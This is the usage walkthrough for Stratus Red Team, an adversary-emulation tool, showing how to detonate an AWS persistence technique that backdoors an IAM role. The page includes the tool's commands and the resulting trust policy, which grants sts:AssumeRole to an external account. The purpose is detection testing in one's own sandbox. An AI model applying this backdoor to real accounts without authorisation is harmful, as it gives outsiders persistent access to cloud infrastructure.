# Examples

This page contains a full example of using Stratus Red Team.

## Authenticating to AWS

First, we'll authenticate to AWS using [aws-vault](https://github.com/99designs/aws-vault):

```bash
$ aws-vault exec sandbox-account
$ aws sts get-caller-identity
{
    "UserId": "AIDA254BBSGPGUZJKQWRD",
    "Account": "012345678912",
    "Arn": "arn:aws:iam::012345678912:user/christophe"
}
```

Stratus Red Team should support any authentication option supported by the AWS Go SDK v2.
The general rule of thumb is: if you can run `aws sts get-caller-identity`, you can run Stratus Red Team.

## Listing available Attack Techniques

Let's say we want to confirm our security products identify common persistence mechanisms in our AWS account.
Let's ask Stratus Red Team for the relevant available attack techniques:

```
$ stratus list --platform aws --mitre-attack-tactic persistence

+-----------------------------------------------+-----------------------------------------+----------+----------------------+
| TECHNIQUE ID                                  | TECHNIQUE NAME                          | PLATFORM | MITRE ATT&CK TACTIC  |
+-----------------------------------------------+-----------------------------------------+----------+----------------------+
| aws.persistence.backdoor-iam-role             | Backdoor an existing IAM Role           | AWS      | Persistence          |
| aws.persistence.backdoor-iam-user             | Create an IAM Access Key on an IAM User | AWS      | Persistence          |
|                                               |                                         |          | Privilege Escalation |
| aws.persistence.iam-user-create-login-profile | Create a Login Profile on an IAM user   | AWS      | Persistence          |
|                                               |                                         |          | Privilege Escalation |
| aws.persistence.malicious-iam-user            | Create an administrative IAM User       | AWS      | Persistence          |
|                                               |                                         |          | Privilege Escalation |
+-----------------------------------------------+-----------------------------------------+----------+----------------------+
```

## Detonating an attack technique

We're interested in `aws.persistence.backdoor-iam-role`, an attack technique that backdoors an existing IAM role to add a trust relationship with a malicious AWS account.

Let's retrieve more information about the technique, either through its [automatically-generated documentation](https://stratus-red-team.cloud/attack-techniques/AWS/aws.persistence.backdoor-iam-role/), or by running:

```
$ stratus show aws.persistence.backdoor-iam-role
Establishes persistence by backdooring an existing IAM role, allowing it to be assumed from an external AWS account.

Warm-up: Creates the pre-requisite IAM role.

Detonation: Updates the assume role policy of the IAM role to backdoor it.
```

We now know that Stratus Red Team will first create an IAM role in the warm-up phase. In the detonation phase, it will backdoor the role.

We could choose to perform the warm-up and detonation phase separately - but for simplicity, let's do it all together:

```
$ stratus detonate aws.persistence.backdoor-iam-role
2022/01/19 10:28:08 Checking your authentication against the AWS API
2022/01/19 10:28:09 Warming up aws.persistence.backdoor-iam-role
2022/01/19 10:28:09 Initializing Terraform
2022/01/19 10:28:18 Applying Terraform
2022/01/19 10:28:32 Backdooring IAM role by allowing sts:AssumeRole from an extenral AWS account
```

Great! The attack technique has been executed against our AWS account.

We can verify this using:

```
$ stratus status
+------------------------------------+-------------------------------+-----------+
| ID                                 | NAME                          | STATUS    |
+------------------------------------+-------------------------------------------+
| aws.persistence.backdoor-iam-role  | Backdoor an existing IAM Role | DETONATED |
...
```

## Viewing the resulting resource

If we open the AWS console and go to the role that Stratus Red Team backdoored, we can see the malicious role trust policy:

```json hl_lines="12 13 14 15 16"
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    },
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::193672423079:root"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
```

## Cleaning up

When using `stratus detonate`, the resources spun up are not cleaned up by default - you'd have to pass the `--cleanup` flag for that.

We can clean up any resources creates by Stratus Red Team using:

```
stratus cleanup aws.persistence.backdoor-iam-role
```